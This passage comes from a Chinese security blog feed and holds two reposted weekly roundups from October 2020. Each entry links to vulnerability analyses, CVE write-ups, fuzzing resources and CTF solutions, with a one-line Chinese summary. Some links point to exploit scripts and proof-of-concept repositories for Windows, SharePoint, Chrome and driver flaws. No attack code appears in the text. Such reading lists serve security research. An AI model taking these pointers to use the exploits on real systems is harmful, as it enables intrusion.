        <content type="html"><![CDATA[<h1 id="2020-10-19-11-1一周安全知识动态"><a href="#2020-10-19-11-1一周安全知识动态" class="headerlink" title="2020.10.19-11.1一周安全知识动态"></a>2020.10.19-11.1一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•Remote Command Execution in Ruckus IoT Controller (CVE-2020-26878 &amp; CVE-2020-26879)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;adepts.of0x.cc&#x2F;ruckus-vriot-rce&#x2F;</span><br><span class="line">Ruckus IoT Controller命令执行漏洞CVE-2020-26878 以及 CVE-2020-26879分析</span><br></pre></td></tr></table></figure><p>•Interacting with a Serial Port</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cybergibbons.com&#x2F;hardware-hacking&#x2F;interacting-with-a-serial-port&#x2F;</span><br><span class="line">硬件串口通信</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•Using a PIE binary as a Shared Library — HCSC-2020 CTF Writeup</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCSC-2020 CTF 逆向题Baseline test writeup</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Explicit Is Always Good? Read the Story of CVE-2020-1034</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.br0vvnn.io&#x2F;pages&#x2F;blogpost.aspx?id&#x3D;2</span><br><span class="line">CVE-2020-1034 widows内核提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Let’s talk macOS Authorization</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;theevilbit.github.io&#x2F;posts&#x2F;macos_authorization&#x2F;</span><br><span class="line">macOS认证分析</span><br></pre></td></tr></table></figure><p>•Samsung S20 - RCE via Samsung Galaxy Store App</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.f-secure.com&#x2F;blog&#x2F;samsung-s20-rce-via-samsung-galaxy-store-app&#x2F;</span><br><span class="line">Samsung S20  RCE漏洞分析</span><br></pre></td></tr></table></figure><p>•Getting started in macOS security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;theevilbit.github.io&#x2F;posts&#x2F;getting_started_in_macos_security&#x2F;macOS 安全研究资源</span><br></pre></td></tr></table></figure><p>•A story of three CVE’s in Ubuntu Desktop</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.eyecontrol.nl&#x2F;blog&#x2F;the-story-of-3-cves-in-ubuntu-desktop.html</span><br><span class="line">ubuntu CVE-2020-15703、CVE-2020-16121以及CVE-2020-15238漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-16939: WINDOWS GROUP POLICY DACL OVERWRITE PRIVILEGE ESCALATION</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;10&#x2F;27&#x2F;cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation</span><br><span class="line">CVE-2020-16939 windows组策略提权漏洞分析</span><br></pre></td></tr></table></figure><p>•UACMe 3.5, WD and the ways of mitigation</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;swapcontext.blogspot.com&#x2F;2020&#x2F;10&#x2F;uacme-35-wd-and-ways-of-mitigation.html</span><br><span class="line">UAC bypasses 技术分析</span><br></pre></td></tr></table></figure><p>•Secure loading of libraries to prevent DLL preloading attacks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;support.microsoft.com&#x2F;en-in&#x2F;help&#x2F;2389418&#x2F;secure-loading-of-libraries-to-prevent-dll-preloading-attacks</span><br><span class="line">dll 注入机制防御机制</span><br></pre></td></tr></table></figure><p>•Issue 2104: Windows Kernel cng.sys pool-based buffer overflow in IOCTL 0x390400</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;project-zero&#x2F;issues&#x2F;detail?id&#x3D;2104</span><br><span class="line">windows内核cng.sys池溢出漏洞分析</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•AFLNet: A Greybox Fuzzer for Network Protocols</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;aflnet&#x2F;aflnethttps:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Au3eO7mEI7E&amp;feature&#x3D;youtu.be</span><br><span class="line">AFLNet 网络协议fuzz开源工具及视频</span><br></pre></td></tr></table></figure><p>•Fuzzing (fuzz testing) tutorial: What it is and how can it improve application security?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.techrepublic.com&#x2F;article&#x2F;fuzzing-fuzz-testing-tutorial-what-it-is-and-how-can-it-improve-application-security&#x2F;</span><br><span class="line">对Dr. David Brumley（a professor at Carnegie Mellon University and CEO）关于fuzz的采访</span><br></pre></td></tr></table></figure><p>•Let’s build a high-performance fuzzer with GPUs!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.trailofbits.com&#x2F;2020&#x2F;10&#x2F;22&#x2F;lets-build-a-high-performance-fuzzer-with-gpus&#x2F;</span><br><span class="line">通过GPU来构建高性能fuzzer</span><br></pre></td></tr></table></figure><p>•Basic Buffer Overflow Guide</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;catharsis.net.au&#x2F;blog&#x2F;basic-buffer-overflow-guide&#x2F;</span><br><span class="line">demo服务器栈溢出fuzz漏洞挖掘以及漏洞</span><br></pre></td></tr></table></figure><p>•The Fuzzing Book</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.fuzzingbook.org&#x2F;beta&#x2F;</span><br><span class="line">fuzz理论与实践比较好的公开电子书</span><br></pre></td></tr></table></figure><p>•How to check code coverage on Linux with gcov, lcov and gcovr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;rOXsKuW5xXw&amp;feature&#x3D;youtu.be</span><br><span class="line">linux系统中如何检查代码覆盖率</span><br></pre></td></tr></table></figure><p>•Getting started with go-fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;adalogics.com&#x2F;blog&#x2F;getting-started-with-go-fuzz</span><br><span class="line">go-fuzz分析</span><br></pre></td></tr></table></figure><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•Firefox Vulnerability Research</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.exodusintel.com&#x2F;2020&#x2F;10&#x2F;20&#x2F;firefox-vulnerability-research&#x2F;</span><br><span class="line">firfox漏洞研究</span><br></pre></td></tr></table></figure><p>•Introducing Microsoft Edge preview builds for Linux</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blogs.windows.com&#x2F;msedgedev&#x2F;2020&#x2F;10&#x2F;20&#x2F;microsoft-edge-dev-linux&#x2F;</span><br><span class="line">在linux上安装windows edge</span><br></pre></td></tr></table></figure><p>•Exploiting a textbook use-after-free in Chrome</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;securitylab.github.com&#x2F;research&#x2F;CVE-2020-6449-exploit-chrome-uafhttps:&#x2F;&#x2F;github.com&#x2F;github&#x2F;securitylab&#x2F;tree&#x2F;main&#x2F;SecurityExploits&#x2F;Chrome&#x2F;blink&#x2F;CVE-2020-6449</span><br><span class="line">Chrome textbook use-after-free 漏洞分析及利用</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•VMware ESXi SLP Use-After-Free Remote Code Execution Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;advisories&#x2F;ZDI-20-1269&#x2F;</span><br><span class="line">CVE-2020-3992VMware ESXi SLP uaf漏洞公告</span><br></pre></td></tr></table></figure><p>•DETAILING TWO VMWARE WORKSTATION TOCTOU VULNERABILITIES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.zerodayinitiative.com&#x2F;blog&#x2F;2020&#x2F;10&#x2F;22&#x2F;detailing-two-vmware-workstation-toctou-vulnerabilities</span><br><span class="line">VMWARE WORKSTATION TOCTOU漏洞分析</span><br></pre></td></tr></table></figure><p>•First Steps in Hyper-V Research</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;msrc-blog.microsoft.com&#x2F;2018&#x2F;12&#x2F;10&#x2F;first-steps-in-hyper-v-research</span><br><span class="line">Hyper-V 虚拟化漏洞研究</span><br></pre></td></tr></table></figure><p>•VM Forking and Hypervisor-based Fuzzing with Xen</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.slideshare.net&#x2F;tklengyel&#x2F;vm-forking-and-hypervisorbased-fuzzing-with-xen</span><br><span class="line">ossummit上关于VM Forking以及Hypervisor-based fuzz的ppt</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•FRITZ!Box DNS Rebinding Protection Bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.redteam-pentesting.de&#x2F;en&#x2F;advisories&#x2F;rt-sa-2020-003&#x2F;-fritz-box-dns-rebinding-protection-bypass</span><br><span class="line">DNS Rebinding保护机制绕过</span><br></pre></td></tr></table></figure><p>•AssaultCube RCE: Technical Analysis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@elongl&#x2F;assaultcube-rce-technical-analysis-e12dedf680e5</span><br><span class="line">AssaultCube RCE 漏洞分析</span><br></pre></td></tr></table></figure><p>•Discord Desktop app RCE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mksben.l0.cm&#x2F;2020&#x2F;10&#x2F;discord-desktop-rce.html</span><br><span class="line">CVE-2020-15174 Discord Desktop app rce漏洞分析</span><br></pre></td></tr></table></figure><p>•GitHub - RCE via git option injection (almost) - $20,000 Bounty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;devcraft.io&#x2F;2020&#x2F;10&#x2F;18&#x2F;github-rce-git-inject.html</span><br><span class="line">GitHub - RCE git option漏洞分析</span><br></pre></td></tr></table></figure><p>•Insecure use of shell.openExternal</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;wireapp&#x2F;wire-desktop&#x2F;security&#x2F;advisories&#x2F;GHSA-5gpx-9976-ggpm</span><br><span class="line">wire app desktop 代码执行漏洞分析</span><br></pre></td></tr></table></figure><p>•SECRET FRAGMENTS: REMOTE CODE EXECUTION ON SYMFONY BASED WEBSITES</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ambionics.io&#x2F;blog&#x2F;symfony-secret-fragment</span><br><span class="line">Symfony框架代码执行漏洞</span><br></pre></td></tr></table></figure><p>•CVE-2020-17365 – Hotspot Shield VPN New Privilege Escalation Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cymptom.com&#x2F;cve-2020-17365-hotspot-shield-vpn-new-privilege-escalation-vulnerability&#x2F;2020&#x2F;10&#x2F;</span><br><span class="line">CVE-2020-17365 Hotspot Shield VPN提权漏洞分析</span><br></pre></td></tr></table></figure><p>•Gateway2Hell – Multiple Privilege Escalation Vulnerabilities in Citrix Gateway Plug-In</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cymptom.com&#x2F;gateway2hell-multiple-privilege-escalation-vulnerabilities-in-citrix-gateway-plug-in&#x2F;2020&#x2F;10&#x2F;</span><br><span class="line">Citrix Gateway Plug-In 提权漏洞分析</span><br></pre></td></tr></table></figure><p>•GitHub Pages - Multiple RCEs via insecure Kramdown configuration - $25,000 Bounty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;devcraft.io&#x2F;2020&#x2F;10&#x2F;20&#x2F;github-pages-multiple-rces-via-kramdown-config.html</span><br><span class="line">通过Kramdown configuration实现github代码执行</span><br></pre></td></tr></table></figure><p>•Citrix ADC (Netscaler ADC) Multi-Factor Bypass</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;vdalabs.com&#x2F;2020&#x2F;10&#x2F;26&#x2F;citrix-adc-netscaler-adc-multi-factor-bypass&#x2F;</span><br><span class="line">Citrix ADC 多因子认证绕过</span><br></pre></td></tr></table></figure><p>•Weblogic RCE by only one GET request — CVE-2020–14882 Analysis</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;testbnull.medium.com&#x2F;weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</span><br><span class="line">CVE-2020–14882 Weblogic RCE 漏洞分析</span><br></pre></td></tr></table></figure><p>•Reversing Pulse Secure Client Credentials Store</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;quentinkaiser.be&#x2F;reversing&#x2F;2020&#x2F;10&#x2F;27&#x2F;pule-secure-credentials&#x2F;</span><br><span class="line">Pulse Secure客户端证书分析</span><br></pre></td></tr></table></figure><p>•Code vulnerabilities put health records at risk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.sonarsource.com&#x2F;openemr-5-0-2-1-command-injection-vulnerability</span><br><span class="line">OpenEMR 5.0.2.1 RCE漏洞分析</span><br></pre></td></tr></table></figure><h3 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h3><p>•Cloud Security Tools</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cloudberry.engineering&#x2F;tool&#x2F;</span><br><span class="line">云安全工具收集</span><br></pre></td></tr></table></figure><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>•NSA Warns Chinese State-Sponsored Malicious Cyber Actors Exploiting 25 CVEs</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;media.defense.gov&#x2F;2020&#x2F;Oct&#x2F;20&#x2F;2002519884&#x2F;-1&#x2F;-1&#x2F;0&#x2F;CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF</span><br><span class="line">我国网络攻击中常用的25个cve</span><br></pre></td></tr></table></figure><p>•Cheating at Online Video Games and What It Can Teach Us About AppSec (Part 1)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.bishopfox.com&#x2F;industry-blog&#x2F;cheating-at-online-video-games-part-1</span><br><span class="line">电子游戏作弊机制分析</span><br></pre></td></tr></table></figure><p>•How Debuggers Work: Getting and Setting x86 Registers, Part 1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.moritz.systems&#x2F;blog&#x2F;how-debuggers-work-getting-and-setting-x86-registers-part-1&#x2F;</span><br><span class="line">调试器的工作机制分析系列文章1</span><br></pre></td></tr></table></figure><p>•How Debuggers Work: Getting and Setting x86 Registers, Part 2: XSAVE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.moritz.systems&#x2F;blog&#x2F;how-debuggers-work-getting-and-setting-x86-registers-part-2&#x2F;</span><br><span class="line">调试器的工作机制分析系列文章2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记|备忘录 </tag>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>(转载)2020.10.12-10.18一周安全知识动态</title>
      <link href="/2020/10/19/%5B%E8%BD%AC%5D2020.10.12-10.18%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/10/19/%5B%E8%BD%AC%5D2020.10.12-10.18%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="2020-10-12-10-18一周安全知识动态"><a href="#2020-10-12-10-18一周安全知识动态" class="headerlink" title="2020.10.12-10.18一周安全知识动态"></a>2020.10.12-10.18一周安全知识动态</h1><p>转自<img src="https://raw.githubusercontent.com/SimonHu-HN/GoPic_Private/master/img/image-20200929114557052.png" alt="image-20200929114557052"></p><h3 id="浏览器漏洞相关"><a href="#浏览器漏洞相关" class="headerlink" title="浏览器漏洞相关"></a>浏览器漏洞相关</h3><p>•DOS2RCE: A New Technique to Exploit V8 NULL Pointer Dereference Bug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.br0vvnn.io&#x2F;pages&#x2F;blogpost.aspx?id&#x3D;1&amp;ln&#x3D;0</span><br><span class="line">V8 issue-1003286 NULL PointerDereference漏洞分析及利用</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘相关"><a href="#漏洞挖掘相关" class="headerlink" title="漏洞挖掘相关"></a>漏洞挖掘相关</h3><p>•Fuzzing Python packages in 5 min using pythonfuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;academy.fuzzinglabs.com&#x2F;fuzzing-python-packages-5-min-pythonfuzz</span><br><span class="line">5分钟学会用pythonfuzz fuzz Python packages</span><br></pre></td></tr></table></figure><p>•Introduction to Go fuzzing: fuzz your first project in a few minutes</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;pA4E8rvQGmY</span><br><span class="line">Go fuzzing 简短视频</span><br></pre></td></tr></table></figure><h3 id="IOT漏洞相关"><a href="#IOT漏洞相关" class="headerlink" title="IOT漏洞相关"></a>IOT漏洞相关</h3><p>•From Zero to main(): Demystifying Firmware Linker Scripts</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;interrupt.memfault.com&#x2F;blog&#x2F;how-to-write-linker-scripts-for-firmware</span><br><span class="line">固件程序link过程解析</span><br></pre></td></tr></table></figure><p>•Analysis &amp; Exploitation of a Recent TP-Link Archer A7 Vulnerability</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;starlabs.sg&#x2F;blog&#x2F;2020&#x2F;10&#x2F;analysis-exploitation-of-a-recent-tp-link-archer-a7-vulnerability&#x2F;</span><br><span class="line">TP-LinkArcher A7 rce漏洞 CVE-2020-10882分析</span><br></pre></td></tr></table></figure><h3 id="虚拟化逃逸漏洞相关"><a href="#虚拟化逃逸漏洞相关" class="headerlink" title="虚拟化逃逸漏洞相关"></a>虚拟化逃逸漏洞相关</h3><p>•Dockerfile Security Best Practices</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cloudberry.engineering&#x2F;article&#x2F;dockerfile-security-best-practices&#x2F;</span><br><span class="line">Dockerfile安全实践</span><br></pre></td></tr></table></figure><h3 id="CTF相关"><a href="#CTF相关" class="headerlink" title="CTF相关"></a>CTF相关</h3><p>•File Stream Oriented Programming: SECCON CTF 2020 - lazynote</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;faraz.faith&#x2F;2020-10-13-FSOP-lazynote&#x2F;</span><br><span class="line">通过SECCON CTF 2020- lazynote来详细描述FSOP</span><br></pre></td></tr></table></figure><h3 id="操作系统漏洞相关"><a href="#操作系统漏洞相关" class="headerlink" title="操作系统漏洞相关"></a>操作系统漏洞相关</h3><p>•Acronis backup software contains multiple privilege escalation vulnerabilities</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.kb.cert.org&#x2F;vuls&#x2F;id&#x2F;114757</span><br><span class="line">CVE-2020-10138 win10 通过Acronis backup 进行提权</span><br></pre></td></tr></table></figure><p>•CVE-2020-16898: “Bad Neighbor”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.mcafee.com&#x2F;blogs&#x2F;other-blogs&#x2F;mcafee-labs&#x2F;cve-2020-16898-bad-neighbor&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;portal.msrc.microsoft.com&#x2F;en-US&#x2F;security-guidance&#x2F;advisory&#x2F;CVE-2020-16898</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;advanced-threat-research&#x2F;CVE-2020-16898</span><br><span class="line">CVE-2020-16898 Windows TCP&#x2F;IP远程命令执行漏洞分析</span><br></pre></td></tr></table></figure><p>•CVE-2020-16952</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;attackerkb.com&#x2F;topics&#x2F;4yGC4tLK2x&#x2F;cve-2020-16952https:&#x2F;&#x2F;srcincite.io&#x2F;pocs&#x2F;cve-2020-16952.py.txt</span><br><span class="line">CVE-2020-16952MicrosoftSharePointServer RCE漏洞exp</span><br></pre></td></tr></table></figure><p>•CVE-2020-12928 Exploit Proof-of-Concept, Privilege Escalation in AMD Ryzen Master AMDRyzenMasterDriver.sys</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;h0mbre.github.io&#x2F;RyzenMaster_CVE&#x2F;#</span><br><span class="line">CVE-2020-12928 AMD RyzenMasterAMDRyzenMasterDriver.sys驱动漏洞分析</span><br></pre></td></tr></table></figure><p>•Exploiting Uses of Uninitialized Stack Variables in Linux Kernels to Leak Kernel Pointers</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;uI377m9S0qs</span><br><span class="line">https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;woot20-paper1-slides-cho.pdf</span><br><span class="line">https:&#x2F;&#x2F;www.usenix.org&#x2F;system&#x2F;files&#x2F;woot20-paper-cho.pdf</span><br><span class="line">linux内核利用栈未初始化变量变量来泄露内核指针</span><br></pre></td></tr></table></figure><p>•Beware the Bad Neighbor: Analysis and PoC of the Windows IPv6 Router Advertisement Vulnerability (CVE-2020-16898)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.quarkslab.com&#x2F;beware-the-bad-neighbor-analysis-and-poc-of-the-windows-ipv6-router-advertisement-vulnerability-cve-2020-16898.html</span><br><span class="line">CVE-2020-16898 windows BadNeighbor poc分析</span><br></pre></td></tr></table></figure><p>•Introducing Edge Vulnerability Research</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;microsoftedge.github.io&#x2F;edgevr&#x2F;posts&#x2F;Introducing-Edge-Vulnerability-Research&#x2F;</span><br><span class="line">windows edge浏览器安全性分析系列文章第一篇</span><br></pre></td></tr></table></figure><h3 id="应用程序漏洞相关"><a href="#应用程序漏洞相关" class="headerlink" title="应用程序漏洞相关"></a>应用程序漏洞相关</h3><p>•Exploiting CVE-2020–25213: wp-file-manager wordpress plugin (&lt;6.9) for unauthenticated arbitrary file upload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;medium.com&#x2F;@mansoorr&#x2F;exploiting-cve-2020-25213-wp-file-manager-wordpress-plugin-6-9-3f79241f0cd8</span><br><span class="line">CVE-2020–25213 wp-file-manager wordpress plugin (&lt;6.9) 免认证任意文件上传漏洞分析</span><br></pre></td></tr></table></figure><p>•Bypassing Trend Micro Web Threat Protection via Punycode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.inputzero.io&#x2F;2020&#x2F;08&#x2F;bypass-trend-micro-web-threat-protection.html</span><br><span class="line">过TrendMicroWebThreatProtection杀软</span><br></pre></td></tr></table></figure><p>•Attackers 